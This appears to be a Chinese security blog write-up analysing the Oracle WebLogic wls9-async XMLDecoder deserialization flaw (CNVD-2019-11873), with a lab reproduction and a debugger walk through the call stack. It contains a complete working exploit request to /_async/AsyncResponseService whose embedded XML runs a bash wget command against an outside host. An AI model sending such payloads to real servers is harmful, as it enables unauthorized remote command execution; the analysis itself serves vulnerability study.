> 原文链接: https://www.anquanke.com//post/id/238644 


# CNTA-2019-0014——WebLogic反序列化XML注入


                                阅读量   
                                **216127**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)



## 一、原理

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0"></a>（一）概述

2019年4月17日，国家信息安全漏洞共享平台（CNVD）收录了由中国民生银行股份有限公司报送的Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-2019-11873）。攻击者利用该漏洞，可在未授权的情况下远程执行命令。

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89CNTA-2019-0014"></a>（二）CNTA-2019-0014

部分版本WebLogic中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在未授权的情况下远程执行命令。<br>
该漏洞的影响版本有WebLogic 10.X和WebLogic 12.1.3。

### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E5%8E%9F%E7%90%86"></a>（三）原理

<a class="reference-link" name="1.%E5%8E%9F%E7%90%86"></a>**1.原理**

WorkContextXmlInputAdapter中对输入的XML未进行有效检查，可导致任意命令执行。<br>
先简单看下Java中xml的结构，来个简单的demo，

```
import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.util.HashMap;

public class DemoOut `{`
    public static void main(String[] args) throws FileNotFoundException `{`
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
        map.put("arr", new String[3]);
        XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("demo.xml")));
        e.writeObject(map);
        e.close();
    `}`
`}`
```

得到的demo.xml如下，

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.8.0_151" class="java.beans.XMLDecoder"&gt;
 &lt;object class="java.util.HashMap"&gt;
  &lt;void method="put"&gt;
   &lt;string&gt;arr&lt;/string&gt;
   &lt;array class="java.lang.String" length="3"/&gt;
  &lt;/void&gt;
 &lt;/object&gt;
&lt;/java&gt;
```

这其中，object标签表示对象；void标签表示函数调用、赋值等操作， 里面的method 属性指定方法名称； array标签表示数组， 里面的class属性指定具体类。<br>
我们再来读取一下这个xml文件，

```
import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class DemoIn `{`
    public static void main(String[] args) throws FileNotFoundException `{`
        XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("demo.xml")));
        Object demo = d.readObject();
        d.close();
    `}`
`}`
```

跟进在调试这段代码的过程中，可以看到以下两个比较有价值的过程点，<br>
一是此处生成一个表达式对象var5，其中会调用HashMap的put将arr给put进去，

[![](https://p2.ssl.qhimg.com/t014f6b168a5849d5d3.png)](https://p2.ssl.qhimg.com/t014f6b168a5849d5d3.png)

最终反序列化恢复成为一个我们最开始构建的对象，

[![](https://p0.ssl.qhimg.com/t01c899a27b5b0ff94e.png)](https://p0.ssl.qhimg.com/t01c899a27b5b0ff94e.png)

我们可以想象，此处的void标签可以表示HashMap对象的put()函数的调用，也应该可以标识其它类的其它函数的调用。

比如，如果我们将demo.xml中的对象由HashMap改为可以执行命令的函数，再赋予适当的参数，就有可能执行恶意功能。<br>
有如下这般xml一个，

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java version="1.8.0_151" class="java.beans.XMLDecoder"&gt;
 &lt;object class="java.lang.ProcessBuilder"&gt;
  &lt;array class="java.lang.String" length="1"&gt;
   &lt;void index="0"&gt;
    &lt;string&gt;calc&lt;/string&gt;
   &lt;/void&gt;
  &lt;/array&gt;
  &lt;void method="start"/&gt;
 &lt;/object&gt;
&lt;/java&gt;
```

再执行刚才的java，

[![](https://p1.ssl.qhimg.com/t018c280c2795118130.png)](https://p1.ssl.qhimg.com/t018c280c2795118130.png)

可以看到calc已经被执行。<br>
我们在刚才的Expression处下断，

[![](https://p4.ssl.qhimg.com/t016b9ad2050ee85d0c.png)](https://p4.ssl.qhimg.com/t016b9ad2050ee85d0c.png)

当执行完create()之后，即会弹出计算器。

[![](https://p3.ssl.qhimg.com/t01e21851785888fe2e.png)](https://p3.ssl.qhimg.com/t01e21851785888fe2e.png)

也就是说，只要能够传入合适的XML，且顺利被目标的readObject调用，就有可能成功实现RCE。



## 二、调试

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>（一）环境搭建

选用vulhub-master/weblogic/CVE-2017-10271

```
docker-compose up -d
```

将其中的Oracle文件夹拷出，<br>
根据提示，只将/wlserver_10.3/server/lib导入idea即可，用到的主要是wlserver_10.3\server\lib\wseeclient.jar!\weblogic\wsee\server\servlet\BaseWSServlet.class

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A4%8D%E7%8E%B0"></a>（二）复现

Afant1大佬的payload如下，

```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.43.64:7001
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml
Content-Length: 768

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.8.0_131" class="java.beans.xmlDecoder"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;wget 192.168.43.134:9898&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;

```

开启http服务查看效果，

[![](https://p1.ssl.qhimg.com/t015a0669572e06c934.png)](https://p1.ssl.qhimg.com/t015a0669572e06c934.png)

发送，

[![](https://p5.ssl.qhimg.com/t01360c21afaa0e135b.png)](https://p5.ssl.qhimg.com/t01360c21afaa0e135b.png)

http.server收到请求，复现成功。

[![](https://p3.ssl.qhimg.com/t01ab4bb65a6f445631.png)](https://p3.ssl.qhimg.com/t01ab4bb65a6f445631.png)

### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E8%B0%83%E8%AF%95"></a>（三）调试

调用栈

```
readObject:203, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
handleRequest:27, WorkAreaServerHandler (weblogic.wsee.workarea)

handleRequest:141, HandlerIterator (weblogic.wsee.handler)
dispatch:114, ServerDispatcher (weblogic.wsee.ws.dispatch.server)
invoke:80, WsSkel (weblogic.wsee.ws)
handlePost:66, SoapProcessor (weblogic.wsee.server.servlet)
process:44, SoapProcessor (weblogic.wsee.server.servlet)
run:285, BaseWSServlet$AuthorizedInvoke (weblogic.wsee.server.servlet)
service:169, BaseWSServlet (weblogic.wsee.server.servlet)
...
```

下面分两段看一下流程。

##### <a class="reference-link" name="1.BaseWSServlet.service-&gt;HandlerIterator.handleRequest"></a>1.BaseWSServlet.service-&gt;HandlerIterator.handleRequest

在service下断点，发送payload，断下，

[![](https://p2.ssl.qhimg.com/t013398462f6f3619bb.png)](https://p2.ssl.qhimg.com/t013398462f6f3619bb.png)

由于没有强制使用HTTPS，可以顺利通过下面这些步骤，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cb562465dad9c47e.png)

接下来将生成一个AuthorizedInvoke，

[![](https://p3.ssl.qhimg.com/t014a54cd214f817230.png)](https://p3.ssl.qhimg.com/t014a54cd214f817230.png)

这个函数的最后，调用了AuthorizedInvoke.run()，

[![](https://p2.ssl.qhimg.com/t016ea9a503443657ba.png)](https://p2.ssl.qhimg.com/t016ea9a503443657ba.png)

接下来我们继续跟进run()。<br>
run中生成了processerList，当var2为SoapProcessor时，跟进process()函数，

[![](https://p2.ssl.qhimg.com/t017a13743500c41246.png)](https://p2.ssl.qhimg.com/t017a13743500c41246.png)

我们发送的是POST类型的数据包，此处顺利进入handlePost()，

[![](https://p0.ssl.qhimg.com/t01cff0897a87d0b9c9.png)](https://p0.ssl.qhimg.com/t01cff0897a87d0b9c9.png)

跟进handlePost，var7负责建立连接相关事宜，

[![](https://p4.ssl.qhimg.com/t018d1e4060ea58e46c.png)](https://p4.ssl.qhimg.com/t018d1e4060ea58e46c.png)

跟进invoke，

[![](https://p1.ssl.qhimg.com/t01be887e7714c3d17b.png)](https://p1.ssl.qhimg.com/t01be887e7714c3d17b.png)

我们可以看到，var1负责与攻击机的连接，<br>
接下来声明了一个Dispatcher，并set了connection和port的相关属性，然后调用了dispatch，

[![](https://p4.ssl.qhimg.com/t0197b23a5b54440d30.png)](https://p4.ssl.qhimg.com/t0197b23a5b54440d30.png)

dispatch有发送、分派之意，正常来讲，对于一个访问，WebLogic应该会有正常的dispatch，至于载荷是不是合理，应该交由后面的逻辑处理部分来处理，我们跟进之。<br>
dispatch开头的异常应该不能阻断前进的步伐，

[![](https://p5.ssl.qhimg.com/t0127d9ed82990c319d.png)](https://p5.ssl.qhimg.com/t0127d9ed82990c319d.png)

向下看，到第70行，handleRequest即为处理请求。

[![](https://p1.ssl.qhimg.com/t013595dea1f593de70.png)](https://p1.ssl.qhimg.com/t013595dea1f593de70.png)

<a class="reference-link" name="2.HandlerIterator.handleRequest-&gt;XMLDecoder.readObject"></a>**2.HandlerIterator.handleRequest-&gt;XMLDecoder.readObject**

在进入HandlerIterator.handleRequest之前，我们先看一下HandlerChain的内容，

[![](https://p4.ssl.qhimg.com/t01b95d6962e58f1760.png)](https://p4.ssl.qhimg.com/t01b95d6962e58f1760.png)

可以看到是21个handler，<br>
跟进handleRequest

[![](https://p0.ssl.qhimg.com/t010bb1b5b1896a7d92.png)](https://p0.ssl.qhimg.com/t010bb1b5b1896a7d92.png)

可以看到正在遍历刚才的handlers，<br>
我们设置一个条件断点，在index为16（对应WorkAreaServerHandler）时断下，

[![](https://p0.ssl.qhimg.com/t01fe6f3d2d3ef17b5d.png)](https://p0.ssl.qhimg.com/t01fe6f3d2d3ef17b5d.png)

运行到handleRequest(var3)，

[![](https://p4.ssl.qhimg.com/t01dfcd2b39c4d81ccd.png)](https://p4.ssl.qhimg.com/t01dfcd2b39c4d81ccd.png)

跟进之，可以看到此处的var5在从var4读取xml输入，

[![](https://p1.ssl.qhimg.com/t01b61988a740075f70.png)](https://p1.ssl.qhimg.com/t01b61988a740075f70.png)

详细看下，此时的几个变量信息，

[![](https://p1.ssl.qhimg.com/t01d88f470e25ceb923.png)](https://p1.ssl.qhimg.com/t01d88f470e25ceb923.png)

[![](https://p5.ssl.qhimg.com/t014f52ebec65eb61eb.png)](https://p5.ssl.qhimg.com/t014f52ebec65eb61eb.png)

可以看到，正是我们的payload，此处我们的payload还是很完好的，也没有经过任何检查。

跟进XMLDecoder的生成，这是个routine了。

[![](https://p1.ssl.qhimg.com/t01a83298cce618f358.png)](https://p1.ssl.qhimg.com/t01a83298cce618f358.png)

跟进receiveRequest，调用了WorkContextLocalMap的receiveRequest。

[![](https://p4.ssl.qhimg.com/t013195f3bffef72601.png)](https://p4.ssl.qhimg.com/t013195f3bffef72601.png)

接下来就进入了熟悉的流程，到此，没有见到有效的防护，

[![](https://p3.ssl.qhimg.com/t0166a2ab50af839451.png)](https://p3.ssl.qhimg.com/t0166a2ab50af839451.png)

readEntry()里调用了readUTF()，

[![](https://p2.ssl.qhimg.com/t01d3fe336bd8a8630c.png)](https://p2.ssl.qhimg.com/t01d3fe336bd8a8630c.png)

readObject在此展现。

[![](https://p1.ssl.qhimg.com/t015d85a48d0218c945.png)](https://p1.ssl.qhimg.com/t015d85a48d0218c945.png)

再继续执行即是触发。



## 三、收获与启示

CNTA-2019-0014和CVE-2017-10271具有较高的相似性，都是在某一点上对用户发送的XML缺乏合理的检查，最终导致RCE。



## 参考链接

[https://www.cnblogs.com/afanti/p/10792982.html](https://www.cnblogs.com/afanti/p/10792982.html)<br>[https://xz.aliyun.com/t/4895](https://xz.aliyun.com/t/4895)<br>[https://www.cnvd.org.cn/webinfo/show/4989](https://www.cnvd.org.cn/webinfo/show/4989)
